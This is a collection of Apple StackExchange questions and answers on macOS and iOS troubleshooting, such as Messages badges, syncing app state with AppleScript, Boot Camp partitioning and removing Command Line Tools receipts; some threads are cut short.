["Q: iOS Widget for turning Wi-Fi on/off Is there a widget for turning on and off Wi-Fi? I have to open up the settings and go to Wi-Fi to switch it off. For me, this is annoying and unacceptable. Just can't live with it.\nI know:\n\n\n*\n\n*What the Wi-Fi button on Control Center does\n\n*Control Center's behaviour has changed since iOS 11 update\n\n*How to turn off Wi-Fi from the Settings app\n\n\nI just want quick access to WiFi toggle like on Android.\n\nA: iOS apps cannot control Wi-Fi, so it is not possible for an app to provide a Today widget to change the Wi-Fi power.\nIf your device is jailbroken, you can install  RealCC, which makes the toggles in Control Center for Wi-Fi and Bluetooth control the power rather than connections.\n\nA: Unless your device is jailbroken this is not possible.

I had about 1.5 GB free after download but it only worked after I had about 2 GB free.\n\nA: I've had the error, but I had enough free space, so that was not the problem.\nIn my case, it was because I had turned off the iPhone pass code.

The app icon is consistently showing a count of 3 which has remained intact despite doing the following:\n\n\n*\n\n*Exchanging messages with multiple recipients.\n\n*Clearing all the messages (from Messages on Mac as well as on all the linked devices).\n\n*Disabling/Enabling the iMessage account (on my linked Mac, iPhone and iPad).\n\n*Disabling/Enabling Messages in iCloud (on my Mac).\n\n*Disabled/Enabled Text Messages forwarding from iPhone to Mac and iPad.\nI have set up my iPhone to automatically forward Text Messages to my Mac and iPad.\nMy iOS devices are running iOS 11.4 and Mac is running macOS High Sierra 10.13.5.\nNote that the count on the icon is not just incorrect, it is persistently stuck at number 3. Count on iOS devices are appearing correct.\nWhen there are unread messages, the count is shown correctly to reflect the number of unread messages. As soon as all the messages are read/deleted, the count goes back to 3.\nI have a single Mac linked to my Apple ID. How do I proceed with getting rid of this incorrect count badge?\n\n\nRight clicking the Messages icon in the Dock shows three numbers as shown below. However, no message is shown in the Messages windows.\n\n\nA: I've had two cases where that bubble remains even after I signed out of Messages entirely and then signed out of my AppleID everywhere (FaceTime, iCloud, App Store, iTunes, etc... which is everywhere I can think of - perhaps I missed a spot) so I'm thinking there's some chance there's a bug in the database(s) that track this and clearing that will be quite difficult.\nOn these two cases, I just set up a temporary admin account and logged out of the main account. Then I did a proper backup (Time Machine or other) and deleted the offending user account. Once you clear the home folder /Users/whatever - then I made a new user account with the same short name (or different if you please) and copied back only the working files - not the settings.\nThis has fixed the Messages count for both cases - so it wasn't really a problem online - more of a local database corruption that I wasn't clever enough to pick apart and locate what set of files or database held the wrong unread badge count.\nIt's a very indirect fix and lots of work, but the new account olympics did help when I don't know precisely how to zero the count.\n\nA: @fsb provided the hint I needed. After having this plague me for months I saw fsb's post above and just right-clicked the Messages icon. The menu item at the top of the list enabled me to open the thread that had the unread messages. Fixed for me!\n\nA: None of the other answers really solved it for me. After killing the Dock or signing out and back in, I'd have the badge return eventually. \nSo in Finder I went to ~/Library and searched for the listed phone number. It showed me a file in ~/Library/Messages/Archive/yyyy-mm-dd/ that was named for the phone number. Deleted the file and then killed the dock (by executing killall Dock in the Terminal) and the badge was gone instantly.\nI have also figured out the cause: deleting a message on your iPhone or iPad without reading it. It's always an automated message with a 2FA code or something, and that's because I could see the code and typed it in and then deleted the thread later because I always trash that junk.\n\nA: Ran into this once myself.

Window positions aren't one either. If with a keystroke I can close everything and open applications from a saved state file, that would be enough. It's mostly about apps opening the files I had open in the other computer. If I could have more than one saved state (e.g. one per project), that would be excellent. If I can get some initial code I could take it from there\n\nA: NOTE: Answer still under construction...\nOne more section to write, detailing the scripts that will sync the running state of the applications.  I have to write these scripts first.\n\nThe Objective\n\nBroadly, to devise a means for two Macs to save and share information on the user environment, including application states/properties, loaded documents, and actively running applications.\n\nYour initial request was to seamlessly move from one [machine] to the other and recreate the state of open applications I had in the previous one with a command.  You've since relaxed your expectations a little, and clarified that \"hot-reloading\" applications is not sought, and minutiae such as window sizes and positions are not a concern.\nConceptual Methodology\n1. Two scripts + a shared data file\nMy initial idea was to have a copy of a script (probably an AppleScript) on each machine that would have a handler that was responsible for getting information about the application environments and storing it in a shared file to which both machines would have access (e.g. via Dropbox, iCloud, ...).  The script would have a separate handler that would retrieve the contents of this shared file, and apply the settings to the local environment.  This would require the user to run the script once upon arriving at a machine in order to apply the settings; and once just before departing the machine in order to update the shared data file with new settings.\n2. .savedState synchronisation\nMy second thought was inspired from another person's notion of synchronising the file located at ~/Library/Preferences/ByHost/com.apple.loginwindow.*.  Whilst doing so would not be helpful, it raises the question of whether synchronising .savedState files found in the folder ~/Library/Saved Application State would be the solution.\nAdmittedly, I can't claim to know what the full ramifications of attempting to sync these files across two different systems would be.  That's not to say that anything bad would happen, but it's unknown territory, so the potential for undesirable results is there.  However, my feeling is that it would largely be safe, and probably quite innocuous, given that, if anything were to go awry from a bad .savedState file, the solution is pretty much always to just delete the .savedState file, and allow the application in question to generate a new one.\nI suspect a combination of these two methods will be needed.\nSyncing\nSyncing the ~/ folder via Dropbox\nSyncing the home folder would likely only provide you with a means to make documents available on each machine, but possibly not allow you to sync the ~/Library folder if its location cannot be changed.  Also, this folder is 26GB in size on my system, so it would involve paying a subscription for extra cloud storage space.\nUltimately, if syncing the home folder is limited to Downloads, Documents, Music, and Movies, it isn't much of a benefit over having the Documents and Desktop folders synced through iCloud.\nHowever, having documents synced is a good idea, as it will be important to have access to the same files on both computers, and for changes on one to be reflected on the other.  iCloud, whilst quite slow, is fine for this job.\nSyncing the ~/Library folder\nThe ~/Library folder, or at least specific subfolders of it, would be a crucial goal if contemplating using .savedState files to map application states from one system to another.  A home cloud storage solution would be ideal for this task, as it doesn't levy any subscription fees; your sensitive data would be safe in your possession and not owned by Dropbox or Apple; and there'd be no speed throttling outside of that imposed by your ISP if syncing across the internet.\nI already use Resilio Sync, which is free for individual use, and uses peer-to-peer transfers to keep selected folders in sync between any machines or devices on which you install the application.  It would be a simple case of selecting the ~/Library folder or the ~/Library/Saved Application State folder to be monitored and synced in real-time.  The folders can remain where they are, and if you choose to pay for additional features (one-off payment), you can selectively sync individual files within a folder, and encrypt them for data security.  I really recommend this application, and it seems ideal for this specific situation.\nScripting\nIf synchronising the .savedState files is successful, what might be needed is a script to open (or reopen) the applications that were running on the other machine.  Reopening will hopefully get the application to read its updated .savedState files and replicate the state it was in on the other system.  I think this will have partial success, but perhaps not total.\nRetrieving a list of running applications\nThis is trickier than it sounds because there are various ways to test if an application is running, and no one test is perfect.  There are the applications in the foreground that are visible with windows; there are menu bar applications, some with no windows, running as background processes; and there could be hidden applications minimised in the dock, with no visible windows.\nAfter experimenting with a few different methods in AppleScript, this line of code seems to produce a good, exhaustive list of running applications, including menu bar applications:\n    tell application \"System Events\" to set OpenApps to the ¬\n        name of every application process whose ¬\n        class of its menu bar contains menu bar and ¬\n        POSIX path of the application file does not start with \"/System\" and ¬\n        POSIX path of the application file does not start with \"/Library\"\n\nIt takes a couple of seconds to return a result, but I don't think that speed will matter too much if the scripts are implemented in a sensible way.\nA Bash method of getting a list of running applications is this:\n    IFS=$'\\r\\n'; basename $( \\\n    egrep -i -e '^/Applications/.*\\.app/Contents/MacOS/[^/]+$' \\\n    <<<\"$(ps -U 501 -o 'comm')\" ) | sort -u\n\nIt's fast (instantaneous), but does miss a couple of menu bar and background applications.\nI think either method will ultimately be fine for what's needed, as the most important applications to capture are the ones you're interacting with in the foreground, and those ones are caught by most methods.\nStoring information in a shared settings file\nWriting the settings that need to be saved can be done to a .plist file, which stores key/value pairs of data along with the data types.  This allows any value to be saved and retrieved by its name.  They're also relatively simply to read and edit programmatically using either AppleScript or the command line utility plutil.\nLet's assume the shared settings file will be saved at ~/Example/savedState.plist where ~/Example/ is some sort of shared folder (e.g. a cloud storage folder) to which both computers have access.\nUsing AppleScript, this is how one might save a list of applications that are currently open:\n    property plist : \"~/Example/SavedState.plist\"\n\n    tell application \"System Events\"\n        if not (the file plist exists) then make new property list file ¬\n            with properties {name:plist}\n\n        set plistf to the property list file named plist\n\n        tell plistf to make new property list item with properties ¬\n            {name:\"OpenApps\", kind:list, value:OpenApps}\n    end tell\n\nwhere the variable OpenApps is taken from the AppleScript snippet above.  Cleverly, the make new property list command will overwrite any existing key/value item that already has the name \"OpenApps\", so it won't be duplicated.\nNext, we need a way to quit applications on a system:\n    to kill(A as list, X as list)\n        local A, X\n\n        if A = {} then return\n\n        script jury\n            property A0 : item 1 of A\n            property An : rest of A\n            property OK : A0 is not in X\n        end script\n\n        tell the jury\n            ignoring application responses\n                if its OK then quit the application named (its A0)\n                kill(its An, X)\n            end ignoring\n        end tell\n    end kill\n\nThis is a recursive handler that is passed a list of applications to quit (parameter A) and a list of applications that are to be excluded (parameter X).  It then goes through the list one by one and checks the application isn't one of the ones in X before quitting it and moving onto the rest of the list.\nRe-opening documents\nBy employing the use of synchronised .savedState files, the hope is that, once an application on one system re-initialises (say, by closing and opening it again), it will re-open documents that were open on the other.\nHowever, it may be prudent store our own list of documents that we can detect (to the best of our abilities) are open and active.\n\n[NOTES FOR ME TO INTEGRATE INTO ANSWER]\n\n\n*\n\n*I Noticed that some .savedState files are stored in ~/Library/Saved Application State as aliases (symbolic links) instead of the actual file itself.  These typically link to ~/Library/Containers/%bundle-id%/Data/Library/Saved Application State/%file% where %bundle-id% is, for example, com.apple.Preview, and its corresponding %file% is com.apple.Preview.savedState.\n\n\nThis means that ~/Library/Containers will likely have to be synchronised between the two machines as well.\n\n\n*\n\n*.savedState files are deleted whenever an application exits cleanly.  Therefore, bear in mind that closing applications on one system will delete those data files, then potentially synchronise these deletions with the other machine.\n\n\nA: Previously (prior to Sierra) you could have Portable Home Directories, stored on the network that allow easy usage of multiple machines with the same user profile. Of course it worked best for user profiles that did not have hundreds of gigabytes of data in them. Performance of this approach over wired LAN was very good, some places I worked at used it to enable hot-desking.\nThe only thing like this still supported are Mobile Accounts. \nhttps://support.apple.com/kb/ph25671\nAlternatively you could use iCloud Drive to sync ~/Desktop and ~/Documents, and any additional folders you require.\nOr, you might want to look at having your Home folder stored in the cloud using csync, Dropbox or whatever. https://www.amsys.co.uk/using-cloud-storage-sync-home-folder-macs/\nThese would all require only one computer being used at a time, so perhaps not suitable?\n", "Q: How to stop AppleScript application content files from appearing in \"Recents\" folders? I'm a big fan of AppleScript and am currently utilising it for a range of different tasks on my computer. However, one thing I have noticed is that after I have created an Application in AppleScript, many of the content files including the main.scpt and the applet.icns files begin appearing in my \"Recents\" folder in Finder. This can be rather annoying as it quickly clogs up my recents folder especially if I have been working on a number of different apps.\nMy question is: how do I make sure that only the application itself can be viewed in the recents folder and not some of its content files as well.

No, you can't specify a different set of backup targets by disk and they all get all data, so your smallest disk needs to accomodate all data.  \nThough, you might be able to backup a full Time Machine config, alter it to trim out big volume directories, back up to SSD, restore full backup configs, backup to HDD, repeat.  Seems more work than worth it.  \nAnd what happens if you run the small backup on your HDD by mistake?  Will Time Machine try to reclaim space on things that it doesn't see as needing backup?\nA quick and dirty rsync script to copy critical stuff to SSDs might work better. \n", "Q: Control iPhone 6S with keyboard My dad dropped his iPhone 6S down the toilet \nLuckily it still works, except for the whole of the touchscreen. \nHe wants to get the photos off, he’s got most of them but for some reason iCloud has left a big gap from September 2017. \nI’ve bought a Lightning to USB adapter and plugged a keyboard in and managed to unlock it, but now I can’t go any further. \nI can get to the settings app but can’t navigate through it with a keyboard. I can open Bluetooth settings but not enable it, I can long press the home button to receive the prompt to enable Siri but not enable it without touching the screen. Same with VoiceOver. \nCan anyone recommend a way of controlling the settings without using the touch screen?\n\nA: Have you tried to tripple-click the home button, or tripple-click f5 on the keyboard, to enable VoiceOver? I'm thinking that's what the accessibility shortcut is set to by default.\nOnce VoiceOver is enabled, you should be able to control the iPhone with the VoiceOver keyboard commands (turn on quick nav to navigate the iPhone with arrow keys only).\n", "Q: How suppress \"Open in app\" banner in Safari on iPhone? When I view some photos at a web site in Safari on my iPhone 6 under iOS 11, I get a banner on top suggesting I open the photo in the Google Photos app (as you can see below):\n\nFor reasons not worth going into, I don't want to use the Google Photos app for this, I want to use Safari, but without the \"Open in the Google Photos app\" banner. How can I do that?\n\nA: It is currently not possible for end users to hide the app banner if the website chooses to show it. If the website does not provide the ability to hide the banner then you cannot hide it after the fact.\nIf your device is jailbroken, you can install NoAppBanners from https://repo.auxiliumdev.com/.\n\nA: I found a way to do this: open photos.google.com in Safari, then pin the page to the iPhone home screen as follows:\n\n\n*\n\n*Touch the share icon (i.e., the box with the upward-pointing arrow).\n\n*Touch the grey \"Add to Home Screen\" icon.\n\n*Enter a label for the icon that will be added to the home screen.\n\n*Touch \"Add\" or, on the keyboard, \"Done\".\n\n\nWhen you invoke Safari via the icon for the pinned page, photos.google.com comes up full screen without the banner about the Google Photos app.\n", "Q: Can I have photos on my iCloud but not held on my iPhone?

I was pretty happy with the purchase as I was getting 40% higher writing speeds and slightly higher read speeds with the Aura Pro X vs the Apple stock one (might be due to it being almost full when tested).\nHowever, I have noticed several issues recently. Firstly, I noticed that the mouse movement was lagging notably when connected to a certain power outlet in my university, making it unusable. More recently I noticed it overheats a lot (in 3 years I had never heard fan noises), even when it is asleep with the lid down it is notably hot. \nAlso while asleep, there's a red light on, that can be seen through the air vents. I'm pretty certain this red light was not visible before the upgrade, I even checked with a friend's same model Macbook Pro and we could not see any lights coming through the air vents.\nI did a clean install on the new SSD (No Time Machine backup), and I have tried doing an SMC and NVRAM/PRAM reset without any luck. \nI was aware of the decrease in battery life that some Aura Pro SSD customers reported , but I was not expecting this. (I have not heard back from OWC after contacting them a couple weeks ago.) \n\nA: I also recently purchased an Aura Pro X and it has the red LED on as well. Got in touch with their tech support and they informed me that the LED is expected and normal per their engineers. To clarify, this LED is part of the OWC SSD itself (right next to the screw).\nKind of annoying that it's on all the time, but at least it's not a bad thing.\nI haven't experienced any of your other issues, but I have yet to use my MacBook Pro extensively since installing it.\n\nA: I can’t comment yet, so I’m asking here. It might be useful to mention the OS you’re running, as Aura had (still has) issues with OS that are bellow 10.13 High Sierra.\nThere’s a 5-year warranty on those products, I believe, so that should be an option. Also have you tried live chatting with them? They offer this service on their Consumer Services page.\n\nA: I recently changed the original 128 Gb ssd of my Macbook Pro Early 2015 with Owc Aura Pro X 500Gb and have the same issues: the led remains always on, but the worse thing is that the battery is consumed very fast when disconnected from power line, and the temperature is higher than before.\nI tried to change power save settings in High Sierra but nothing changed.\n\nA: UPDATE:\nI have been in contact with OWC/MacSales support again several times on this issue. Day before yesterday they recommended the PRAM and SMC reset. I did both as instructed, then left the machine sleeping with battery power only for the night, and it showed a decrease to 53% battery life overnight. So currently there is no improvement on this problem.\nAgain today I had a chat with the support team, and the most recent quote from the OWC support person is that the 3 of us in our department which have the same problem should all get our batteries replaced.\nFrom what I'm seeing, my battery life is just fine, so this does not seem to be a fix for the actual problem.\nWith the Apple drive installed, the machine would sleep in my backpack over the weekend or longer without any significant onboard heat being generated, and stay that way without significantly depleting the battery.\nI'm currently running a test with the machine doing normal duty (connected to 2 external monitors, running email, graphics design program, parallels and Articulate Storyline, as well as google backup and sync, and Microsoft OneDrive in the background)\nFrom the System Profiler, it shows current power drain at 1159mA, and a capacity of 5635 mAh, so battery life should be about 4-5 hours.\nORIGINAL POST:\nI have recently contacted OWC Support on this issue, and their instructions per the chat I had are below.

(Or I do not know if they support it)\nIf anyone knows how to do it on a System having APFS, please let me know. \nHere's the update on error screens and what I'm seeing:\nStep 1: Launch the Boot Camp Assistant and I see this:\n\nStep 2: It asks me to locate and select the ISO file of Windows 8.1 which I downloaded from Microsoft website.\n\nStep 3: I see that it started downloading the Microsoft Support software. Also, I observe that a 4.2 GB of unknown format disk is created in disk utility. (Which I suppose, is a placeholder for the currently downloading Windows support software since Apple says, my MacBook version do not need any external bootable thumb drive)\n\n\nStep 4: I see that downloading is completed and installation has begun.\n\nStep 5: I check the disk utility once again to see available partitions. (To make sure if boot camp is doing partition in next step or not)\n\nStep 6: I see that disk partitioning has begun\n\nThanks in advance.\nStep 7: I get an error in boot camp which reads: Disk cannot be partitioned.\n\nStep 8: Now, I check disk utility once again to see if any changes are there:\n\nI see that two partitions named as OSXRESERVED and BOOTCAMP are created but they are unmounted by default.\nStep 9: I try to rerun the boot camp assistant to try my luck and I get the following error:\n\nRead the error description: It reads as my Macbook's startup disk should be formatted as Mac OS Extended (Journaled). But, my MacBook is having APFS which is different from Mac OS Extended (Journaled).\nAny proper help is much appreciated.\n\nA: Use bootcamp assistant to partition the SSD, then install windows on the new windows-supported partition.\nAlternatively boot into recovery mode, use disk utility to delete the existing partition (this will wipe everything, if you have anything you need on the Macbook's SSD back it up first), then install windows and let the windows installer partition the SSD.\n\nA: If you have already created your bootable Windows 8.1 install USB thumb drive you should be able to just follow the prompts inside the Boot Camp application.\nAfter you create the Windows installer the Mac will reboot and give you a dialog box that allows you to allocate the amount of space you want to dedicate to Windows. Just slide the handle in the middle left or right until you have the desired space configuration. \nYou should not have to concern yourself with the file system the Mac side is using as Boot Camp will format that part of this disk specifically for windows.\n", "Q: Can I playback Voice Memos recordings using a different app? I often record meetings that can run 2 hours long. When I play them back, it is very hard to drag that tiny little slider to navigate to the point at which I left off. Often, I will tap the wrong thing and the Voice Memo returns to the beginning point. Both of these scenarios are very frustrating. It would be nice to play recordings back on an app that will Pause and stick even if you close the app. And it would be great to be able to have a more precise slider to navigate within a long recording. \n\n\nA: Have you tried sending the recording using the export button as an email attachment - goes as an m4a file so should be easy to play on quite a few apps.\nExport button icon:\n\n\nA: There is a similar question on this page, and the answer on how to accomplish this with iTunes and the music app is also here:\n\nSince Voice Memos both plays and records audio, and recording can't be done in the background as far as I know, then the whole app does not work in the background. That sounds more like a design decision to me, rather than a technical limitation. In theory, Apple could have made the playing audio part of Voice Memos to work in the background.\nA very long-winded way to get to do what you need is to import the voice memos to your iTunes library. In iTunes, select your iPhone from the Devices list. One of the tabs (probably Music or Info) has a checkbox that will enable transferring voice memos into iTunes. When this is enabled and you sync your device, the voice memos get imported and a playlist titled \"Voice Memos\" is created.\nAt this point, those audio files and the \"Voice Memos\" playlist should act like any other. You could, for instance, get to the audio files from the \"Voice Memos\" playlist and then set the metadata for each file by right-clicking it and selecting the Get Info dialog. Useful voice memos can be set to a Media Type of Audiobook--which makes them available to you as audiobooks in the iPod app.\nIf you make them Audiobooks or basically do anything that sends them to the iPod app; then you could play them in the background while you open your note-taking app of choice.\nYou do not need to set them as audiobooks, though. Once they're in the voice memos playlist; then you can sync the playlist as you would any other. The caveat is that without metadata, it becomes hard to find the files in the iPod app. In iTunes, for instance, they show either with a blank artist name or with an artist name of \"Untitled\". That is why I strongly suggest adding metadata ASAP.\nI am just reminded of Dragon Naturally Speaking and Dragon Dictate. I do not have them, but I have heard nothing but great things about them. You may try their apps (one of them is free, I believe). They may offer you better features over the included Voice Memos app. I've seen screenshots where it looks like in addition to having a record option, the UI also has a text field for you to type on.\nHope this helps.\n-- Christian Correa\n\nhttps://apple.stackexchange.com/a/18957/258380\n", "Q: iCloud Documents and Desktop empty - macOS High Sierra I logged out of my iCloud account.

Gets up, goes to phone which reads \"bring more chips back\" sent by boyfriend who is still on the couch.\n\n\nA: Yes it is perfectly possible to spoof the location of an iPhone. In fact Apple actually provide a mechanism for developers to do just that. \nIt involves editing the .plist fils got maps and a quick search will provide multiple tutorials. If I’d however not fir the faint hearted and  I doubt anyone would go to the trouble when switching off location services would be just as effective in hiding their location \n", "Q: Assigning an application to a keypress I have written an Applescript to change screen resolutions.  I have converted it to an APP.  When I click on the icon, it works perfectly.  However, I would like to assign it to a keypress.  I have read tons of postings on the internet and I cannot get it to work. I am using High Sierra, but am wondering if this is the problem.  Despite various not assigned key presses such as a four key press, still no luck.   Here is what I have done:\n\n\n*\n\n*Enabled Automator in Accessibility Services.\n\n*Saved my compiled script through Automator as an App.  (works fine).\n\n*Opened Keyboard Shortcuts, and TRIED to add the app as a service, but adding doesn't seem to show up.  Seems like one time it did, but still didn't work.\n\n*Opened Keyboard Shortcuts, and added to to Applications, and designate the keypress, but no go.  It won't work\n\n\nI have been told that if I add it to ~/library/services it will work but there are two folders:\nSystem > Library > Services  but this is locked and I tried to change the permissions and despite the fact that I am the only one on the computer, it says I don't have enough rights.  Its my computer.. what gives?\nUsers > Lad > Library (hidden) > Services:  added the apps.  They do not show up on the Keyboard Shortcuts choices.\nAm I doing something wrong?\nThanks.\n\nA: Instead of converting your Applescript into an app, turn it into an Automator Service.\nOpen automator. When prompted to choose a type of document, select \"Service\". Afterwards, change the dropdowns so the sentence at the top of the screen reads: \"Service receives no input in any application\"\nNext, drag the Run Applescript action into your workflow (it's under utilities), remove the pre-populated \"on run [...] end run\" code (since you have no input), and paste your Applescript into the box. Lastly, save and name your service.\nYou can now set up a keyboard shortcut for your service in Settings → Keyboard → Shortcuts → Services.\n\nYou could also create an automator service that does nothing but launch a specific app, and assign that service to a keyboard shortcut. In this case, the code for the AppleScript portion of the automator service would be: do shell script \"open [path to app]\"\n", "Q: Boot camp assistant can only change disk1 I'm trying to setup and iso file on a flash drive from my macbook using the Boot camp assistant.  It recognizes the iso file, but I am only given one option of using it on disk1 of my own computer and cannot change this to my flash drive.  How can I give Boot camp assistant the ability to recognize the external drive?\nI'm running High Sierra 10.13.2\nFor reference, the iso file is for the windows 10 os.\n\nA: Bootcamp doesn't have the ability to install Windows on external storage. The Windows installer itself can't install Windows to external storage either, so this feature can't be inplemented to Bootcamp.\n", "Q: How to completely disable backupd-helper? I am using macOS High Sierra 10.13.5, and with iCloud enabled.\nI tried to kill backupd-helper many times, and I didn't have Time machine running, but it keeps use my disk IO:\n\nEven after I kill the process, it will automatically start again. How can I completely disable it? Thanks!\n\n\nA: You could try navigating to '/System/Library/LaunchDaemons/com.apple.backupd-helper.plist' and changing 'RunAtLoad' to NO. I haven't tested this out, but I suspect it would work.\nThis (editing the plist) can also be done from the command line, but I won't get into that here. \n", "Q: Removing uninstalled Command Line Tools from AppStore updates I have deleted the Xcode Command Line Tools from my machine by essentially removing the folder. However, AppStore still shows updates from the CLI tools, which obviously I don't want.\nI've been trying to properly understand where AppStore looks to figure out what needs updating, but I haven't been able to find a certain answer yet. I tried editing the updatejournal file, but that didn't help, so I've since restored it.\nI started to suspect that the fact that pkgutil shows some CLTools-packages might be the cause of this. Forgetting them does not work however as the bom are neither in /var/db/receipts or /Library/Receipts (the pkgutil --forget essentially fails because of this).\nI did however find them after a lot of searching in /System/Library/Receipts. Those I can't delete though due to the system security. I can of course bypass that and delete them to see if it works, but I don't want to do that \"just to see\".\nI would like to find a proper solution to this.\nAny ideas what I should do here? \n\nA: I managed to fix it, it seems like I suspected, the problem was the boms in the /System/Library/Receiptsfolder. \nSo I booted into recovery mode, disable SIP, moved all files from that folder that had com.apple.pkg.CLTools*in their name, and the update in the App Store went away. Then I booted into recovery again to enable SIP.\nIt doesn't feel quite right to disable the security, but I gave it a try in this case as other similar problems seemed to be related to lingering bom files, so perhaps it makes sense.\n\nA: There are 2 steps for clean removal\n\n\n*\n\n*Delete /Library/Developer/CommandLineTools directory (as mentioned above).\n\n*Reset to default command line tools by running \n\n\n\nxcode-select -r\n\nExplanation: \nWhen command line tools are installed, the path for command line tools is set to \"/Library/Developer/CommandLineTools\". This can be checked by running\n\nxcode-select -p\n\nEven if we remove the directory, system would go and check there. \nOnce you reset the path and run xcode-select -p, it gives an error\n\nxcode-select: error: unable to get active developer directory, use sudo xcode-select --switch path/to/Xcode.app to set one (or see man xcode-select)\n  This would bring it to the initial state.\n\nRunning any command, say \"python3 --version\" without resetting the path would give:\n\nerror: tool 'python3' requires Xcode, but active developer directory '/Library/Developer/CommandLineTools' is a command line tools instance\n\nand once you reset the path, it will will prompt to install command line tools along with :\n\nxcode-select: note: no developer tools were found at '/Applications/Xcode.app', requesting install. Choose an option in the dialog to download the command line developer tools.\n\n\nA: I just spent hours on this exact issue and FINALLY FIGURED IT OUT, for anyone reading this in the future.\nDeleting /Library/Developer/CommandLineTools didn't work.\nxcode-select -r didn't work.\nThere were no receipts or boms in the usual places (/var/db/receipts, /Library/Receipts, and /System/Library/Receipts).\nKnow what it was? The receipts were in /Library/Apple/System/Library/Receipts. Removed everything with CLTools or SDK in the name and the system update for the CLT disappeared. THANK THE LORD. Not sure if SIP needed to be disabled for this or not (I had it disabled).\n\nA: Delete this folder and your headache's will be gone forever:\n\n/Library/Developer/CommandLineTools\n\n\nA: My reinstalled macOS Mojave had exactly the same problem. I installed Xcode and CLT both, then 6 or 7 CLT updates come out from System Update, suggesting me to install old version CLTs.\nI then removed this folder /Library/Developer/CommandLineTools, reboot, all the updates are gone.\nI didn't remove the receipt things.\n\nA: Thanks Alex, this was exactly the information I needed.\nOn a fairly recent Mac setup (Apple Silicon chip, macOS 12.0 Monterey Beta), having installed the Command Line Tools then uninstalled them by deleting /Library/Developer/CommandLineTools and running sudo xcode-select -r, I was still getting updates to the tools in System Preferences > Software Update.\nIndeed, the receipts are at /Library/Apple/System/Library/Receipts, in the form of files\ncom.apple.pkg.CLTools_Executables.{bom,plist}\ncom.apple.pkg.CLTools_SDK_macOS*.{bom,plist}\ncom.apple.pkg.CLTools_macOS_SDK.{bom,plist}\nThey are protected by SIP: to delete them, I had to disable SIP first (ie disable SIP, delete the files, re-enable SIP).\n\nA: Upon testing on macOS 12.4, Software Update in System Preferences has the plist and bom stored in /Library/Apple/System as installer pacakges volume. The process to remove them:\n\n*\n\n*disable SIP\n\n*Run the following command line\n\n*enable SIP\n\nthe command line:\nVol=\"/Library/Apple/System\"; if [ \"$(csrutil status | awk -F': ' '{print $2}')\" = \"disabled.\" ]; then /usr/sbin/pkgutil --pkgs=\"com.apple.pkg.CLTools_.*\" --volume \"$Vol\" | while read -r pkg; do sudo /usr/sbin/pkgutil --forget \"$pkg\" --volume \"$Vol\"; done; else echo \"After disbale SIP, run this command again, and then enable SIP.\"; fi\n\nsimple explain：\nif SIP is disabled, it reads all com.apple.pkg.CLTools_* package ID and remove them one by one by assign volume path to \"/Library/Apple/System\".\n\nA: Following on what TonyL. shared, you can currently (as of macOS Ventura) forget any package by:\n\n*\n\n*Temporarily disable SIP\n\n*Run sudo pkgutil --forget _ANY_PACKAGE --volume \"/Library/Apple/System\"\n\n*Enable SIP\n\n\nA: *\n\n*Remove\nsudo rm -rf /Library/Developer/CommandLineTools\n\n\n\n*If needed install again\nsudo xcode-select --install\n\n", "Q: Is Safari allowing extensions to be installed by stray clicks in a web page? Sometimes when I go to visit my parents, they ask me to fix their Macbook because something is wrong with Safari. The find that there is an extension installed and that it has set the home page in the browser. Unfortunately I don’t remember the name of the last one but I think it was “Smart Search” or “Safe Search” or something like that. \nI know how to uninstall an extension, but I’m wondering how it gets installed in the first place. I think my parents know enough about computers to not download and install random programs of the internet so I suspect they are getting tricked into clicking something in a web page. But, is that possible? Can a website install an extension on the sly like that? It’s never happened to me.\nThey're running macOS High Sierra 10.13.5, Safari 11.1.1.\n\nA: It’s far more likely they installed software that says it’s for “playing videos” or “flash player malware / adware” or just installing Java which loads cruft now a days unless you carefully read and correctly opt out.\nIf you run Malware Bytes anti Mac - what specific malware and adware are your parents getting in to? That would give you specific bad actors and then be able to target specific behaviors or training needed.\nYou could try installing a locked down browser like Brave, but I’m guessing they’ll want something that has un-desired add on and you’ll either need to outsource the cleaning or remove the admin account. Even iPads get hijacked with bad ads that pop up scam messages.

I cannot gaurantee this will work for you, but I've tried this in High Sierra and it worked for me.

The main question: I have two partitions in my HD (the original \"Macintosh HD\" and a new one \"macOS\"). If in \"macOS\" I have the OSX running – and actually booted in it –, can I erase the \"Macintosh HD\" partition or will there be problems?\nThe situation: I need it because suddenly my \"Macintosh HD\" stopped booting, every time I turned my mac on, it stopped in the first loading screen. I used the Recovery Mode and tried to restore the partition, but no success on it. I then reinstalled OSX in a new partition (\"macOS\"), so that I could launch my OS successfully. In this new partition, everything is ok. The problem is: right now, I have a 400GB partition not working.\n\nI am not sure if the original Macintosh partition carries some important stuff for the launch system or if it can be erased (since I have another running partition).\n\nA: Apple recommends an erase install when you need to start fresh.

I can no longer put it back (it doesn't stay on or falls off immediately). Is it possible to reattach or do I need a replacement part?\nHere's the part I need (It used to be soldered on)\n\n\n\n\nA: You may be able to salvage the component; it is possible that you can continue to use it because it's not damaged.\nIf you can hold it down with tape (just for testing) and it powers up properly, chances are good you can resolder it back on to the logic board.  However, you can't do it with a typical soldering iron.  You will need a reflow gun that blows hot air so you can solder all contacts simultaneously.  \nIf you don't have the skills to do this or have (or want to invest in) the proper equipment, your best bet is to send it in for repairs.\n", "Q: Is there anyway to prevent backups from saving iMessage videos I send? Is there any way to prevent iOS backups from saving iMessage videos I send as part of a conversation?\nI'd like to still backup all iMessage text, other iMessage content, and videos received, just not videos I send. I'm willing to use iTunes or any other software to do backups.\nWhy the heck would that be useful?\nI send video clips all the time via iMessage and they account for roughly 99% of the back up space I use in iCloud storage. Yes backups are a good thing. The problem is many people, including me already use services to back up their videos like Google photos or something else.  So you effectively pay twice for the very large space taken by all iMessage videos. \nThis is a relatively new problem, I'm guessing for many users, when iOS started offering the new (and sane) option to keep iMessages synced across devices.\nPhotos have the same problem, just to a smaller degree because they're orders of magnitude smaller.\nWhy not turn off backup of just iMessage content using options available?\nPotentially years of conversations with friends/family, I think of as a small part of a life archive. \nMaybe 20 years from now, to read some insignificant exchange with a no longer living relative, I think is a cool option for the future. Time will tell if it actually ever has any value.\nWhy not just continue backing up videos elsewhere and then before a backup, delete them before starting a backup?\nTo start, I'm not sure it's possible for end users to specifically access and delete only videos that are attached as part of iMessage conversations. However even if it were, you might imagine how this creates a new manual process to worry about or a more complex process.\nEnvironment?\niPhones and iPads. I try to ensure I waste enough money so all hardware is relatively current. Normally use latest iOS versions. Willing to use developer betas if it offered a new option for this.\n\nA: In your original question you mention iCloud backups, so I'll address that first. If you don't mind not backing up Messages at all, then you could turn off Messages in Settings app > Your Name/Apple ID > iCloud > Manage Storage > Backups > This iPhone under \"Choose Data to Back Up\" - that is assuming 